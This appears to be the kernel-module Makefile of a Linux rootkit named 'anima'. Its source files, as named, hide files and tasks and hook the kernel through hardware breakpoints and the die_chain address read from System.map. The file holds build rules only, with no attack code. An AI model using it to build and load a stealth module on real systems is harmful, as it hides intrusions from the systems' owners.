obj-m += anima.o
anima-objs := init.o debug.o hide_file.o hide_task.o ksyms.o libc.o syscalls.o vfs.o x86_hw_breakpoint.o x86_utils.o


DIE_CHAIN = $(shell awk '/die_chain/ { print $$1 }' /boot/System.map-`uname -r`||echo 0)

EXTRA_CFLAGS = -std=gnu99 -I$(PWD)/../include -DDEBUG -DCOMPILE_TIME_DIE_CHAIN=0x$(DIE_CHAIN)

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) EXTRA_CFLAGS="$(EXTRA_CFLAGS)" modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) EXTRA_CFLAGS="$(EXTRA_CFLAGS)" clean
